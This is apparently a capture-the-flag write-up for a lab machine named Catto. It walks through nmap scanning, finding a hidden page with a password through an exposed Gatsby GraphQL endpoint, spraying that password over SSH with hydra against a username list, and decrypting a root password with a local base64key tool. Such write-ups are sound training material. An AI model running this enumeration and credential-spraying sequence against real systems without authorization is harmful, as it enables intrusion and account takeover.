# Catto

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.139
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 15:03 +08
Nmap scan report for 192.168.183.139
Host is up (0.17s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
2500/tcp  filtered rtsserv
4907/tcp  filtered unknown
8080/tcp  open     http-proxy
18080/tcp open     unknown
30330/tcp open     unknown
36123/tcp open     unknown
38439/tcp open     unknown
42022/tcp open     unknown
42086/tcp filtered unknown
50400/tcp open     unknown
56339/tcp filtered unknown
```

Lots of ports open. Did a detailed scan as well:

```
$ sudo nmap -p 8080,18080,30330,36123,38439,42022,50400 -sC -sV --min-rate 3000 192.168.183.139
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 15:05 +08
Nmap scan report for 192.168.183.139
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
8080/tcp  open  http    nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Identity by HTML5 UP
|_http-open-proxy: Proxy might be redirecting requests
18080/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
30330/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
36123/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
38439/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
42022/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 cc2151f2c62aadd6ca0704de705ffa13 (RSA)
|   256 05e490d2002b9d14e39f4468d28ebcdc (ECDSA)
|_  256 ca804973f0c805aebd2b42371d13e071 (ED25519)
50400/tcp open  http    Node.js Express framework
|_http-title: Error
|_http-cors: HEAD GET POST PUT DELETE PATCH
```

### Web Enum --> GraphQL&#x20;

Port 8080 shows a portfolio page:

<figure><img src="../../../.gitbook/assets/image (1761).png" alt=""><figcaption></figcaption></figure>

It was rather static, so I moved to port 30330. This page had some book reviews:

<figure><img src="../../../.gitbook/assets/image (3843).png" alt=""><figcaption></figcaption></figure>

This page looked more dynamic, so I ran a directory scan with `feroxbuster`, which found nothing of interest. Since we couldn't find anything with wordlists, I took a look through the local files:

There were a few interesting folders:

<figure><img src="../../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

There wasn't much within the folders. On the 'Using Typescript' page, there was a link to documentation:

<figure><img src="../../../.gitbook/assets/image (1525).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.gatsbyjs.com/docs/how-to/custom-configuration/typescript/" %}

On the documentation page, there was mention of GraphQL being used, and sure enough `/__graphql` was a valid directory on the website as per the documentation:

<figure><img src="../../../.gitbook/assets/image (3582).png" alt=""><figcaption></figcaption></figure>

The left had some queries already valid, so I checked those out. Using the `allSitePage` reveals all directories, including a hidden one:

<figure><img src="../../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

Visiting it reveals a password:

<figure><img src="../../../.gitbook/assets/image (1768).png" alt=""><figcaption></figcaption></figure>

This was a password to a Minecraft server. We didn't have a user, but the Minecraft page had some that we could try:

{% code overflow="wrap" %}
```
Minecraft: The Island by Max Brooks, #1 New York Times bestselling author of World War Z, is the first official Minecraft novel. In the tradition of iconic stories like Robinson Crusoe and Treasure Island, Minecraft: The Island will tell the story of a new hero stranded in the world of Minecraft, who must survive the harsh, unfamiliar environment and unravel the secrets of the island.

We loved this book so much that created a server. Already invited and added keralis, xisuma, zombiecleo, mumbojumbo, and waiting for a reply on the entire hermicraft clan. There is a limit on the server, but at least sabel, yvette, zahara, sybilla, marcus, tabbatha and tabby are already online and building.

Good luck everybody!
```
{% endcode %}

We can gather all the usernames into one wordlist:

```
sabel
yvette
zahara
sybilla
marcus
tabbatha
tabby
keralis
xisuma
zombiecleo
mumbojumbo
```

I used `hydra` to brute force the creds:

```
$ hydra -L users -p WallAskCharacter305 192.168.183.139 ssh -s 42022
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-12 15:20:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:11/p:1), ~1 try per task
[DATA] attacking ssh://192.168.183.139:42022/
[42022][ssh] host: 192.168.183.139   login: marcus   password: WallAskCharacter305
```

We can then `ssh` in as `marcus`:

<figure><img src="../../../.gitbook/assets/image (1770).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### .bash --> Base64key Root Creds

There was a weird folder `.bash` within the user's home directory:

```
[marcus@catto ~]$ ls -la
total 20
drwx------  5 marcus marcus 167 Nov 25  2020 .
drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
drwx------  4 marcus marcus  39 Nov 25  2020 .config
drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
-rw-------  1 marcus marcus  33 Jul 12 06:59 local.txt
drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm

[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
```

This string looked like `base64` but it wasn't. I looked at other binaries with `base` as part of their name:

```
[marcus@catto ~]$ base
base32     base64     base64key  basename
```

`base64key` required a private key to decrypt, so I just tried the user's password and it worked:

```
[marcus@catto ~]$ base64key
Usage: ./a.out message key (0:encrypt|1:decrypt)
./a.out "Hello world" MYPRIVATEKEY 0
./a.out ttz9JqxZHBClNtu= MYPRIVATEKEY 1
[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269
```

We can then `su` to `root`:

<figure><img src="../../../.gitbook/assets/image (2591).png" alt=""><figcaption></figcaption></figure>
